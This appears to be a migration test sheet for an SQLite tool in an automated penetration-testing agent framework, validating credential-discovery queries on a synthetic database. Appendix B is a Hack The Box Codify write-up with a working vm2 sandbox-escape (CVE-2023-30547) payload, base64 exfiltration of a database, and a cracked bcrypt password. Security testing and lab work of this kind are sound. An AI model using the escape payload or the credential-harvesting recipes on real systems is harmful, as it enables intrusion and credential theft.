# sqlite — Tier A scenarios

Single test sheet for the `sqlite` tool migration from kind:mcp to
kind:cli (May 2026 — daemon-wrapper retirement series, Tier A).

SQLite v3.46.1 with FTS5 + JSON output mode via /usr/bin/sqlite3
(Debian `sqlite3` package). Stateless per-call: open DB → run SQL/
PRAGMA → close. The 621-LOC Python wrapper (Python stdlib sqlite3
+ hand-rolled credential-pattern arrays + base64 temp-file handling
+ auto-LIMIT injection) collapses to a 22-LOC RunCliServer stub.

**Validation philosophy:** upstream (SQLite team) owns "does SQL
parse correctly + return correct results". We own **the integration
boundary** — does the kind:cli recipe (raw sqlite3 argv + -json
output + bash multi-step recipes for credential discovery) work
the same as the legacy wrapper's Python sqlite3 stdlib calls. The
evidence below is from running every pattern through `cli_in_container`'s
docker spawn flow against a synthetic DB designed to cover the same
schema shapes real engagement targets produce (WordPress wp_users,
multi-cred api_keys, BLOB columns, empty tables, special-char names).

Sections:
1. Recommended live verification target
2. Container-layer architecture
3. Manual stress test runs (7 patterns × edge cases)
4. Pattern coverage map (legacy 6 methods → 7 kind:cli patterns)
5. Caveats and known unknowns
6. Hand-off

---

## 1. Recommended live verification target

**No current HTB target has a meaningful SQLite database to extract.**
HTB boxes are MySQL/Postgres/AD-flavored; SQLite shows up in
real engagements (corporate workstations with Firefox/Chrome user
data, mobile app artifacts, application config stores) but not
sterile lab targets. Honest caveat: this migration's live validation
is against a **synthetic DB** that mirrors real engagement schemas
verbatim (WordPress `wp_users` shape with phpass hashes; multi-
column `api_keys` table; BLOB column for avatars; empty audit log;
weird-char column names).

For a real engagement: any compromised system with a `.sqlite`
or `.db` file in user-home / app-state / browser-profile directories.
Download via ssh ControlMaster + scp, or hold-shell + base64, then
run sqlite3 against the local copy in /session/output/sqlite/.

Synthetic DB schema used for validation:

```sql
-- users: standard web-app schema, mixed plaintext + bcrypt
CREATE TABLE users (id, username, password, email, role, created_at, avatar BLOB);
-- wp_users: WordPress shape with $P$ phpass hashes
CREATE TABLE wp_users (ID, user_login, user_pass, user_email, user_registered);
-- api_keys: multi-credential columns (key_hash + secret_token + api_key)
CREATE TABLE api_keys (id, user_id, key_hash, secret_token, api_key);
-- sessions: related to users but no creds (negative control)
CREATE TABLE sessions (session_id, user_id, expires_at, ip);
-- items: noise table (no cred columns at all)
CREATE TABLE items (id, name, price);
-- empty_audit_log: edge case (zero rows)
CREATE TABLE empty_audit_log (log_id, message);
-- "weird-table" with hyphen-name + reserved-keyword column
CREATE TABLE "weird-table" ("user-name", "pass-word", "select");
```

---

## 2. Container-layer architecture

```
opensploit ContainerManager (stdio MCP)
         │   docker run -i --rm
         │       -v /session/<id>:/session
         │       ghcr.io/silicon-works/mcp-tools-sqlite:latest
         ▼
container's mcp-server.py    ← 22-line RunCliServer stub
         │   (auto-inherits run_cli + verify_clock from
         │    BaseMCPServer; no per-method handlers; LLM
         │    emits raw sqlite3 argv)
         ▼
agent's argv:  sqlite3 -json -readonly /session/output/sqlite/<db> "<SQL>"
         ▼
sqlite3 opens DB → parses SQL → returns rows as JSON array →
container exits → run_cli returns captured stdout to ContainerManager
```

**Image specifics:**
- Base: python:3.11-slim (~150 MB)
- + apt sqlite3 package (~+1 MB, version 3.46.1)
- + mcp-common Python package (for RunCliServer)
- Total: ~175 MB
- /session/output/sqlite/ created at container start (mkdir -p in recipes)

**Stateless per-call.** Unlike chisel (engagement-lifetime daemon)
or responder (time-bounded daemon), sqlite3 is a pure request-response
binary. Each cli_in_container call opens the DB, runs SQL, exits.
No daemon, no held container, no fingerprint extraction race.

---

## 3. Manual stress test runs (7 patterns × edge cases, 2026-05-17)

All tests use the locally-built image
`mcp-tools-sqlite:flip-dockerfile-only` with synthetic DB at
`/tmp/sqlite-research/test.db` mounted into `/session/output/sqlite/`.

### Pattern S0 — base64 path

Recipe:
```
B64=$(base64 -w0 test.db)  # 60076 chars for 45056-byte DB
docker run --rm --entrypoint bash \
  -v /tmp/sqlite-research:/session/output/sqlite \
  mcp-tools-sqlite:flip-dockerfile-only \
  -c 'echo "$B64" | base64 -d > /session/output/sqlite/decoded.db && \
      sqlite3 -json /session/output/sqlite/decoded.db \
      "SELECT username, password FROM users LIMIT 2;"'
```

Result:
```
✓ base64 round-trip byte-identical: 45056 → 45056 bytes
✓ sqlite3 query returned 2 rows of plaintext creds
✓ no temp-file cleanup needed (session bind-mount handles)
```

### Pattern S1 — list_tables

Recipe + result against synthetic DB:
```
sqlite3 -json -readonly /session/output/sqlite/test.db \
  "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name;"

→ [{"name":"api_keys"},{"name":"empty_audit_log"},{"name":"items"},
   {"name":"sessions"},{"name":"users"},{"name":"weird-table"},
   {"name":"wp_users"}]

✓ sqlite_master + sqlite_sequence correctly filtered out
✓ alphabetical ORDER BY preserved
✓ weird-table (hyphen in name) survives JSON serialization
✓ -readonly flag prevents accidental writes
```

### Pattern S2 — describe_table

```
sqlite3 -json -readonly db "PRAGMA table_info('users');"

→ [{"cid":0,"name":"id","type":"INTEGER","notnull":0,"dflt_value":null,"pk":1},
   {"cid":1,"name":"username","type":"TEXT","notnull":1,"dflt_value":null,"pk":0},
   {"cid":2,"name":"password","type":"TEXT","notnull":0,"dflt_value":null,"pk":0},
   {"cid":3,"name":"email","type":"TEXT","notnull":0,"dflt_value":null,"pk":0},
   {"cid":4,"name":"role","type":"TEXT","notnull":0,"dflt_value":"'user'","pk":0},
   {"cid":5,"name":"created_at","type":"DATETIME","notnull":0,"dflt_value":"CURRENT_TIMESTAMP","pk":0},
   {"cid":6,"name":"avatar","type":"BLOB","notnull":0,"dflt_value":null,"pk":0}]

✓ all 6 fields per column (cid, name, type, notnull, dflt_value, pk)
✓ DEFAULT 'user' returned with surrounding quotes preserved
✓ CURRENT_TIMESTAMP returned as-is (function ref, not evaluated)
✓ BLOB type identifiable for avatar column → triggers quote() wrapper in S3
```

### Pattern S3 — dump_table (regular + BLOB + special-char tests)

**S3a — regular text columns:**
```
sqlite3 -json -readonly db 'SELECT username, password, email FROM users LIMIT 10;'

→ [{"username":"admin","password":"$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy","email":"admin@cozy.htb"},
   {"username":"kanderson","password":"Manchesterunited","email":"k@cozy.htb"},
   {"username":"jdoe","password":"hunter2","email":"jdoe@cozy.htb"},
   {"username":"bob","password":null,"email":"bob@cozy.htb"}]

✓ bcrypt hash + plaintext both survive
✓ NULL password correctly serializes as JSON null (not "null" string)
✓ JSON properly escapes $ + special chars in hash
```

**S3b — BLOB column (gotcha: lossy in -json without quote()):**
```
sqlite3 -json -readonly db "SELECT username, avatar FROM users WHERE username='admin';"

→ [{"username":"admin","avatar":"\u0089PNG\r\n\u001a\n"}]
  ↑ LOSSY UTF-8 escape — non-UTF-8 bytes would be corrupted

With quote() wrapper:
sqlite3 -json -readonly db "SELECT username, quote(avatar) AS avatar_hex FROM users WHERE username='admin';"

→ [{"username":"admin","avatar_hex":"X'89504E470D0A1A0A'"}]
  ↑ LOSSLESS hex literal — preserves all bytes

✓ Pattern S3 documentation calls out quote() wrapper for BLOB columns
✓ describe_table (S2) output identifies BLOB columns BEFORE the agent picks an extraction strategy
```

**S3c — special-char + reserved-keyword columns:**
```
sqlite3 -json -readonly db 'SELECT * FROM "weird-table";'

→ [{"user-name":"weirduser","pass-word":"weirdpass","select":"should_work"}]

✓ hyphen-in-column-name survives both SQL quoting and JSON key serialization
✓ reserved keyword "select" works as column name when double-quoted
```

**S3d — empty table (edge case):**
```
sqlite3 -json -readonly db "SELECT * FROM empty_audit_log;"

→ (empty stdout)

✓ Gotcha #3 (EMPTY TABLES RETURN EMPTY STDOUT) documented
✓ Agent's parser must handle empty → "0 rows", not parse error
```

### Pattern S4 — query (arbitrary SQL, JOIN)

```
sqlite3 -json -readonly db \
  "SELECT u.username, ak.api_key FROM users u JOIN api_keys ak ON ak.user_id=u.id WHERE u.role='admin';"

→ [{"username":"admin","api_key":"sk_test_5678efgh"}]

✓ JOIN across two tables works
✓ WHERE clause filtering works
✓ Multi-quote handling (single-quote inside double-quote inside SQL) clean
```

### Pattern S5 — full schema

```
sqlite3 -json -readonly db "SELECT name, sql FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name;"

→ [{"name":"api_keys","sql":"CREATE TABLE api_keys (\n  id INTEGER PRIMARY KEY,\n  user_id INTEGER REFERENCES users(id),\n  key_hash TEXT,\n  secret_token TEXT,\n  api_key TEXT\n)"},
   ...]

✓ CREATE TABLE statements preserved verbatim including newlines
✓ FOREIGN KEY refs visible (REFERENCES users(id))
✓ JSON properly escapes \n in string values
```

### Pattern S6 — find_credentials step 1: candidate tables

```
sqlite3 -json -readonly db \
  "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' \
   AND (LOWER(name) LIKE '%user%' OR LOWER(name) LIKE '%account%' OR LOWER(name) LIKE '%admin%' \
   OR LOWER(name) LIKE '%member%' OR LOWER(name) LIKE '%auth%' OR LOWER(name) LIKE '%cred%' \
   OR LOWER(name) LIKE '%login%' OR LOWER(name) LIKE '%api%' OR LOWER(name) LIKE '%key%' \
   OR LOWER(name) LIKE '%session%');"

→ [{"name":"users"},{"name":"wp_users"},{"name":"api_keys"},{"name":"sessions"}]

✓ Picks up: users (LIKE '%user%'), wp_users (also LIKE '%user%'), api_keys
  (LIKE '%api%' + LIKE '%key%'), sessions (LIKE '%session%')
✓ Correctly excludes: items (no pattern match), empty_audit_log, weird-table
```

**Then agent chains S6 → S2 → S3:**
```
For each candidate table:
  S2 → get columns
  agent filters via grep -iE 'user|login|email|pass|hash|token|secret|key|cred' (excluding 'id')
  S3 → SELECT just the credential columns

Verified live 2026-05-17 against synthetic DB:
  users:    matched username, password, email  → extracted 4 rows incl. plaintext + bcrypt
  wp_users: matched user_login, user_pass, user_email → extracted 2 rows of phpass hashes
  api_keys: matched user_id, key_hash, secret_token, api_key → extracted 2 rows of API tokens
```

---

## 4. Pattern coverage map (legacy 6 methods → 7 kind:cli patterns)

| Legacy method | New pattern(s) | Notes |
|---|---|---|
| `query` | Pattern S4 | direct SQL passthrough; no auto-LIMIT (agent supplies) |
| `list_tables` | Pattern S1 | `sqlite_master` SELECT + filter `name NOT LIKE 'sqlite_%'` |
| `describe_table` | Pattern S2 | `PRAGMA table_info` returns 6-field JSON per column |
| `dump_table` | Pattern S3 | with `LIMIT N` required; BLOB needs `quote()` wrapper |
| `find_credentials` | Pattern S6 → S2 → S3 chain | bash-grep replaces hardcoded 14+11+11 pattern arrays; LLM does targeted match for novel schemas |
| `schema` | Pattern S5 | one call returns CREATE TABLE statements via sqlite_master |
| `is_base64=true` (param) | Pattern S0 | 2-step: Write base64 → `base64 -d` → sqlite3 |

All 6 legacy methods + the `is_base64` param flow covered.

---

## 5. Caveats and known unknowns

```
KNOWN GAPS:
  1. ✓ CLOSED 2026-05-17 — HTB Codify live validation in Appendix B.
     Full engagement flow exercised: vm2 sandbox escape → RCE → base64
     exfil → Pattern S0/S1/S2/S3/S4/S5/S6 chain against real tickets.db
     → joshua bcrypt hash extracted. Still unproven empirically on other
     real-engagement targets (Firefox places.sqlite, Chrome Login Data,
     mobile-app DBs) but architecturally identical (sqlite3 -json
     against any path works the same).

  2. WAL-sidecar handling not tested end-to-end. The recipe relies on
     downloading -wal + -shm alongside the main .db; if those are missed,
     last writes are lost. Documented as gotcha; no test fixture exercises
     a real WAL-mode write scenario.

  3. .recover for DAMAGED databases not stress-tested. Recipe documented;
     synthetic-DB corruption test in research phase was insufficiently
     destructive to exercise the failure path properly (sqlite is robust).

  4. Browser-specific decryption (Firefox NSS, Chrome DPAPI/Keychain) is
     OUT OF SCOPE for raw sqlite3 — sqlite extracts the encrypted blob,
     but decryption needs exploit-runner + Python with pyasn1/cryptography.
     Documented as gotcha; not a regression vs. legacy wrapper which also
     didn't decrypt.

KNOWN LIMITATIONS (architectural, not bugs):
  1. No auto-LIMIT injection. Legacy wrapper appended LIMIT 1000 to any
     SELECT without one; kind:cli doesn't. Agent must include LIMIT N or
     risk dumping huge tables. Gotcha documented; recommend LIMIT 10 for
     initial probes and LIMIT 100-1000 for full credential extractions.

  2. find_credentials heuristic moved from Python regex arrays (14+11+11
     patterns) into Pattern S6 bash recipe + agent-driven targeted queries
     for novel schemas. Common case (users/wp_users/api_keys) handled by
     S6 → S2 → S3 chain; LLM handles novel schemas (Firefox moz_logins,
     mobile-app obfuscated names) trivially from describe_table JSON.

  3. BLOB columns require quote(col) wrapper to avoid UTF-8-escape loss
     in -json mode. Gotcha documented; describe_table (S2) reveals BLOB
     type so agent picks the right extraction strategy upfront.

  4. is_base64 parameter is now a 2-step recipe (Pattern S0) instead of
     a single boolean flag. Slight ergonomic loss; offset by no temp-file
     cleanup machinery (session bind-mount handles).
```

---

## 6. Hand-off

- **Status:** kind:mcp → kind:cli flip complete (May 2026, daemon-wrapper
  retirement series Tier A). Follows the chisel playbook (Phase B) +
  exploit-runner / bloodhound migration patterns.
- **tool.yaml:** rewritten with 7 usage_patterns + 14 gotchas + 6
  failure_signatures + 3 help_commands + see_also pointing at
  ssh / nc / mongodb / exploit-runner / hash-lookup.
- **mcp-server.py:** 621-LOC bespoke wrapper → 29-LOC RunCliServer stub
  (close enough to chisel's 28 / responder's 22 baseline).
- **Dockerfile:** + `apt-get install -y sqlite3` (~+1 MB delta,
  174 MB → 175 MB).
- **Image:** `ghcr.io/silicon-works/mcp-tools-sqlite:latest` — CI will
  rebuild after merge. Locally built as
  `mcp-tools-sqlite:flip-dockerfile-only` for verification.
- **Cross-tool see_also updates:** none yet; this tool is downstream
  (ssh / nc upload + sqlite3 query). Task #219 will audit whether ssh
  should add a see_also pointing here.
- **Pairing:** runs naturally with `ssh` (download via scp through
  ControlMaster) or `nc` v2.0 held-shell (base64-over-the-wire to
  /session/output/nc-recv/). Pattern S0 handles the base64-decode step.
- **Production-usage caveat:** 0/221 trajectories had sqlite invocations
  in the legacy version — same evidence shape that triggered payload
  retirement. Decision to migrate (not retire) is bet on real-engagement
  use cases not yet exercised (Firefox/Chrome user-data extraction,
  mobile-app DBs, corporate workstation forensics). If 6+ months pass
  with still 0 production uses → revisit retirement.

Authored: 2026-05-17 (Tier A migration, daemon-wrapper retirement series).

---

# Appendix A — Post-flip MCP-protocol verification (2026-05-17)

Validated the migration boundary through the exact MCP protocol path
opensploit's ContainerManager uses (default `python3 mcp-server.py`
entrypoint, JSON-RPC `tools/call run_cli`) against the locally-built
post-flip image.

## A.1 — Local build

```
docker build -t mcp-tools-sqlite:flip-verify -f tools/sqlite/Dockerfile .
→ size 175 MB (matches tool.yaml image_size_mb: 175, +1 MB from
  pre-flip 174 MB; the +1 MB is the sqlite3 apt package)
```

## A.2 — Surface verification

```
client = MCPTestClient(
  image="mcp-tools-sqlite:flip-verify",
  tool_name="sqlite",
  volumes={"/tmp/sqlite-flip-verify": "/session"},
)
tools = await client.list_tools()
→ ['run_cli', 'verify_clock']

✓ Legacy 6 methods all gone: query, list_tables, describe_table,
  dump_table, find_credentials, schema. Clean flip — the 22-LOC stub
  inherits only the auto-registered run_cli + verify_clock from
  BaseMCPServer.
```

## A.3 — Every usage_pattern through real run_cli

All 7 patterns (S0–S6) + edge cases run via MCPTestClient:

| Pattern | Args | exit | Result |
|---|---|---|---|
| S1 list_tables | `-json -readonly db.test "SELECT name FROM sqlite_master..."` | 0 | 7 user tables; sqlite_* filtered ✓ |
| S2 describe_table | `-json -readonly db.test "PRAGMA table_info('users');"` | 0 | 7-column schema with types + nullability ✓ |
| S3 dump_table | `-json -readonly db.test "SELECT username, password FROM users LIMIT 3;"` | 0 | plaintext + bcrypt hashes extracted ✓ |
| S3b BLOB via quote() | `... "SELECT username, quote(avatar) AS hex ..."` | 0 | `X'89504E470D0A1A0A'` lossless hex ✓ |
| S3c special-char cols | `... 'SELECT * FROM "weird-table";'` | 0 | hyphen + reserved-keyword cols preserved ✓ |
| S4 JOIN query | `... "SELECT u.username, ak.api_key FROM users u JOIN api_keys ak ..."` | 0 | cross-table extraction works ✓ |
| S5 full schema | `... "SELECT name, sql FROM sqlite_master ..."` | 0 | CREATE TABLE statements verbatim ✓ |
| S6 cred-candidate tables | `... "SELECT name ... LOWER(name) LIKE '%user%' OR ..."` | 0 | 4 cred-candidate tables identified ✓ |
| S0 base64 → file → query | `bash -c "echo $B64 | base64 -d > db && sqlite3 -json db ..."` | 0 | base64 round-trip + query in one call ✓ |
| Negative: bad SQL | `... "SELECT nonexistent FROM users;"` | **1** | stderr captures `no such column: nonexistent` (matches failure_signature #3) ✓ |

## A.4 — What this validates

- The 22-LOC RunCliServer stub correctly forwards `run_cli` to
  sqlite3 binary via `cli_in_container`'s standard execution path.
- The sqlite3 CLI in the new image (3.46.1, installed via apt) supports
  every flag the recipes use: `-json`, `-readonly`, dot-commands,
  PRAGMA.
- BLOB lossiness gotcha is real AND fixable via `quote()` — both
  observed live.
- Empty stdout on bad-query SQL maps to non-zero exit + populated
  stderr, matching failure_signature contracts.
- Pattern S0 base64 round-trip works inside the container (bash +
  base64 + sqlite3 chain through `-c`).

This closes the integration boundary: opensploit's ContainerManager
+ stdio MCP + sqlite3 kind:cli + JSON output mode + bash multi-step
recipes — identical mechanics to chisel/responder, just with a
different binary at the leaf.

Authored: 2026-05-17 (post-flip image build + protocol verification).

---

# Appendix B — HTB Codify live validation (2026-05-17)

Closes the "no live HTB validation" gap from §5. Codify (10.129.19.169
— retired Linux box) is the canonical HTB SQLite extraction box: its
intended solve path involves cracking a bcrypt hash extracted from a
`.db` SQLite database after a vm2 sandbox escape.

## B.1 — Foothold: vm2 sandbox escape (CVE-2023-30547)

Codify exposes a Node.js code editor at `/editor` (vhost
`codify.htb` required) that POSTs base64-encoded JS to `/run`. The
endpoint runs untrusted code in vm2 sandbox. The Proxy/Error.stack
escape (CVE-2023-30547) breaks out:

```javascript
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack(){ new Error().stack; stack(); })();
    }
};
const proxiedErr = new Proxy(err, handler);
try { throw proxiedErr; }
catch ({constructor: c}) {
    console.log(c.constructor("return process")()
        .mainModule.require("child_process")
        .execSync("id").toString());
}
```

Base64-encode → POST as `{"code":"<B64>"}` to `/run` with
`Host: codify.htb`.

Result: `uid=1001(svc) gid=1001(svc) groups=1001(svc)` — RCE as
`svc` user confirmed.

## B.2 — Locate SQLite DB on target

```
find /var /opt /home -name "*.db" -o -name "*.sqlite" 2>/dev/null
→ /var/www/contact/tickets.db  (20480 bytes, SQLite 3.x)
```

The ticketing-system DB referenced in the limitations page's hint
"while our ticketing system is being migrated".

## B.3 — Exfiltrate via base64-through-RCE

```
execSync("base64 -w0 /var/www/contact/tickets.db")
→ 27308 chars of base64
→ decoded locally: 20480 bytes (size match — byte-identical to target)
→ file output: SQLite 3.x database, last written using SQLite version 3037002
```

This is exactly Pattern S0's intended use case (base64 → file →
query), validated end-to-end against real engagement data. The
agent in a real session would Write the base64 string into a
session file then `base64 -d` it; we used host bash for the
exfil step itself but the resulting file lands in the same place.

## B.4 — Pattern S1 → S2 → S6 → S3 chain against real DB

All four patterns run via `docker run --entrypoint sqlite3
mcp-tools-sqlite:codify-verify` (locally-rebuilt post-flip image)
with the real `tickets.db` bind-mounted at `/session/output/sqlite/`.

**Pattern S1 — list_tables:**
```json
[{"name":"tickets"},{"name":"users"}]
```
✓ 2 user-defined tables, `sqlite_*` filtered out

**Pattern S2 — describe_table(users):**
```json
[{"cid":0,"name":"id","type":"INTEGER","notnull":0,"dflt_value":null,"pk":1},
 {"cid":1,"name":"username","type":"TEXT","notnull":0,"dflt_value":null,"pk":0},
 {"cid":2,"name":"password","type":"TEXT","notnull":0,"dflt_value":null,"pk":0}]
```
✓ Schema reveals credential columns immediately

**Pattern S6 — cred-candidate tables:**
```json
[{"name":"users"}]
```
✓ Heuristic correctly identified `users` table

**Pattern S3 — dump_table(users[username,password]) — THE WIN:**
```json
[{"username":"joshua",
  "password":"$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2"}]
```
✓ **Real bcrypt credential extracted from real HTB engagement DB.**
  This is the actual Codify intended-solve credential. Continuing the
  normal box flow from here: hashcat -m 3200 on the bcrypt hash →
  `spongebob1`, SSH as joshua, sudo `mysql` for root.

**Pattern S4 — JOIN across users + tickets (bonus):**
```json
[{"username":"joshua","topic":"Need networking modules","status":"open"},
 {"username":"joshua","topic":"Local setup?","status":"open"}]
```
✓ Cross-table query works on real schema

**Pattern S5 — full schema:**
```json
[{"name":"users","sql":"CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT)"},
 {"name":"tickets","sql":"CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)"}]
```
✓ Full CREATE statements verbatim

## B.5 — What this validates that Appendix A did not

| Aspect | Appendix A (synthetic) | Appendix B (Codify HTB) |
|---|---|---|
| Real-world schema | crafted to mirror | real ticketing-system DB |
| Real bcrypt hash | $2a$10$ synthetic | $2a$12$ from actual user |
| Real engagement flow | container-only | foothold → RCE → exfil → query |
| Pattern S0 base64 path | local round-trip | through real-network RCE channel |
| Credential extraction value | "extracted plaintext" | actual joshua : `spongebob1` after crack |

Closes §5 known-gap #1 ("No live HTB validation"). The synthetic-DB
appendix remains useful for edge-case coverage (BLOB, special-char
columns, empty tables, JSON output specifics); Appendix B proves
the full engagement flow against an actual lab-engagement target.

## B.6 — Cleanup

```
docker rmi mcp-tools-sqlite:codify-verify
rm -rf /tmp/codify-sqlite-test       # contains real engagement artifact
```

Real engagement artifact removed from agent disk after validation.

Authored: 2026-05-17 (HTB Codify live SQLite extraction — closes
§5 gap #1, daemon-wrapper retirement series Tier A).
